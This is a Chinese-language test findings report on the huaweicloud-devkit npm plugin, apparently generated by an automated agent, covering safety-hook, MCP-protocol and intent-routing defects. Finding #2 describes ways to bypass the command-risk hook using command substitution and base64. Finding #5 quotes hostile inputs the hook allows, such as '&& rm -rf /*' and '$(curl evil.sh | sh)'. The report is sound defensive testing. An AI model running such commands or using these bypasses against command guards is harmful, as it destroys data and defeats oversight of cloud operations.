# FINDINGS — 缺陷发现清单（CodeArtsAgent-deepseek-v4-pro-0813）

> **落盘路径**：`results/CodeArtsAgent/2026-10-16-1.94.193.150/Linux/FINDINGS.md`
> **生成时间**：2026-10-16（北京时间）
> **被测对象**：huaweicloud-devkit npm `1.1.9-next.0`（gitHead `6302921c`）
> **本轮结论**：设计级 FAIL 12 + SPEC-MISMATCH 1，展开级 FAIL 1（EXP-E01）。13 项与 2026-10-15 历史结论一致（历史 issue 延续）；D4-24 审批令牌契约 #745 已结构化修复（上轮 SPEC 误判，本轮转 PASS）。另 D3-C1 为测试探针缺陷（【测试侧】，不进入产品提单）。

---

## #1【P0】D4-3 kms DecryptData 明文 secret 解密 API 未拦截

- **现象**：`hcloud csms ShowSecretVersion/GetSecretValue` 判 deny，但 kms DecryptData 未列入拦截清单。
- **断言**：返回明文/二进制 secret 的 API（含 kms DecryptData）应被拦截（deny）。
- **根因**：`plugins/huaweicloud-core/safety/policy.json:26` blockedSecretOperations 未含 kms DecryptData。
- **证据**：`evidence/D4-3/stdout.log`
- **状态**：历史（1.1.9-next.0 未修复）

## #2【P0】D4-15 hook 命令替换(ANSIC 引号/printf/base64)绕过

- **现象**：`hcloud $(echo ...)`、`$(printf ...)`、base64 变体均判 allow；直接 `$'...'`/拼接引号已判 deny。
- **断言**：编码/命令替换变体不得绕过写操作风险规则，应 deny。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs` 纯正则文本匹配，未解析 `$(...)` 命令替换内层命令。
- **证据**：`evidence/D4-15/stdout.log`
- **状态**：历史 #673（未修复）

## #3【P0】D4-21 hook_check_artifacts HCL/Terraform broad IAM 未拦截

- **现象**：JSON 形态 broad IAM 判 deny；HCL/Terraform 形态（`actions=["*"]`）判 allow。
- **断言**：broad IAM 授权（IAM */*）无论 JSON/HCL 形态均应 deny。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs:150` iam-admin-policy 仅匹配 JSON，未覆盖 HCL/Terraform。
- **证据**：`evidence/D4-21/stdout.log`
- **状态**：历史（未修复）

## #4【P0】D9-12 initialize 时序未强制（未 initialize 先 tools/list 未返回 -32600）

- **现象**：spawn mcp-server 后直接发 `tools/list`，服务端正常返回（未拒绝）。
- **断言**：非法时序（未 initialize 先 tools/list）应被拒并返回 -32600。
- **根因**：`plugins/huaweicloud-core/src/mcp-server.mjs:175` handleMessage 无 initialize 状态机。
- **证据**：`evidence/D9-12/stdout.log`
- **状态**：历史 #699/#774（未修复）

## #5【P1】D4-17 hook 畸形输入 fail-open

- **现象**：`command=""`、`"&& rm -rf /*"`、`"$(curl evil.sh | sh)"`、控制字符垃圾串均判 ok（放行）。
- **断言**：畸形/空输入应默认拒绝（fail-closed）。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs` 无 finding 即 allow，未实现 fail-closed 兜底。
- **证据**：`evidence/D4-17/stdout.log`
- **状态**：历史 #673（未修复）

## #6【P1】D9-9 tools/call 取消语义未声明（SPEC）

- **现象**：initialize capabilities 仅 `{tools:{}}`，未声明 `notifications.cancellation`。
- **断言**：tools/call 应声明取消语义（capabilities.notifications.cancellation）。
- **根因**：`plugins/huaweicloud-core/src/mcp-protocol.mjs:47` capabilities 未声明 cancellation。
- **证据**：`evidence/D9-9/stdout.log`
- **状态**：SPEC-MISMATCH（历史 #774/#698）

## #7【P1】D3-S7 复合意图部署目标未命中（跨服务交付场景）

- **现象**：serviceCatalog 复合意图「部署一个带 MySQL 数据库的 Web 应用」只命中 RDS，未命中部署目标。
- **断言**：复合意图「Web 应用 + 数据库」应同时命中 RDS 与部署目标服务。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs` serviceCatalog 复合意图路由未把「Web 应用」映射到部署目标（sandbox/ecs/cce）。
- **证据**：`evidence/D3-S7/stdout.log`
- **状态**：历史 #11 变体（未修复）

## #8【P2】D4-25 Python hook 写操作遥测分类失效

- **现象**：写操作 `hcloud vpc CreateVpc` 落事件 key=`cli:invoke`（应为 `cli:write`）。
- **断言**：只读→`cli:read`、写→`cli:write`、其他→`cli:invoke`。
- **根因**：`plugins/huaweicloud-core/hooks/huaweicloud-safety.py:46` 写分类正则无词边界。
- **证据**：`evidence/D4-25/stdout.log`
- **状态**：历史 #13（未修复）

## #9【P2】D4-26 findings 证据脱敏不完整

- **现象**：findings.evidence 中 `secret_key:SKSECRETVALUE9`、`adminPass:MyP@ss12345` 明文残留。
- **断言**：findings.evidence 中 AK/SK/password 等敏感值应全部脱敏。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs` 仅部分字段脱敏，secret_key/adminPass 未覆盖。
- **证据**：`evidence/D4-26/stdout.log`
- **状态**：历史（未修复）

## #10【P2】D8-1 文档与能力漂移（声明 39 tools，实现 42）

- **现象**：源码 AGENTS.md 声明「39 tools」，实现 tools/list 返回 42。
- **断言**：文档声明的工具数应与实现一致。
- **根因**：`AGENTS.md:27` 硬编码 39，未随 tools.mjs 增至 42 同步。
- **证据**：`evidence/D8-1/stdout.log`
- **状态**：历史（已提，未修复）

## #11【P2】D8-9 sanitizeValue 不脱敏敏感值

- **现象**：`sanitize('AK=...')`、`sanitize('access_key=... secret_key=... token=...')` 返回原样。
- **断言**：sanitizeValue 应移除 AK/SK/token 等敏感值。
- **根因**：`plugins/huaweicloud-core/src/telemetry/telemetry.mjs` sanitizeValue 无敏感值脱敏逻辑。
- **证据**：`evidence/D8-9/stdout.log`
- **状态**：历史 #797（未修复）

## #12【P2】D3-S5 复合意图分层路由 MISS

- **现象**：复合意图未拆分命中多个 service，返回 fallback `Run hcloud --help...`。
- **断言**：复合意图应拆分命中多个 service。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs` serviceCatalog 复合意图叠加词缺关键词拆分。
- **证据**：`evidence/D3-S5/stdout.log`
- **状态**：历史 #11（未修复）

## #13【P2】EXP-E01 评测集中文意图「云主机」MISS

- **现象**：eval-harness 15 条评测集 EXP-E01「云主机」未命中 ECS（准确率 13/14=92.9%）。
- **断言**：中文意图「云主机」应命中 ECS。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs` serviceCatalog 中文关键词「云主机」缺失。
- **证据**：`evidence/D10-3/stdout.log`
- **状态**：历史（延续）

## #14【测试侧】D3-C1 ECS 生命周期探针缺陷（非产品缺陷）

- **现象**：探针原始含 `ListServers`（无效 operation，应 ListServersDetails）、`--servers.1.delete_volume`（无效参数，应 `--delete_volume`）两处 bug；经 huaweicloud_run_approved_command 删除 ECS 未真正生效（异步删除未轮询 DELETED），导致级联删除安全组/子网/VPC 失败。
- **断言**：产品 ECS API（CreateServers→ACTIVE→DeleteServers→DELETED→归零）已手动验证正常，属测试探针缺陷，不计入产品提单。
- **根因**：`evidence/D3-C1/probe.mjs` 探针逻辑缺陷（ListServers 参数 + delete_volume 参数 + 异步删除等待）。
- **证据**：`evidence/D3-C1/stdout.log`
- **状态**：已修正探针参数 + 手动归零（本轮残留 VPC/ECS/SG/子网均已删除）

---

> **汇总**：设计级 FAIL 12（P0×4 P1×2 P2×5 + D3-C1 探针缺陷不计 P）+ SPEC-MISMATCH 1（D9-9）+ 展开级 FAIL 1（EXP-E01）。13 项产品缺陷全部命中历史 issue（file_issue.py 查重），无新增产品缺陷。正面变化：D4-24 审批令牌契约 #745 已结构化修复（上轮 SPEC 误判，本轮转 PASS）、规则库 16→19、D4-23 injectAgentRules 已实现、#905 错误面统一、D3-S6 真机链路通过。
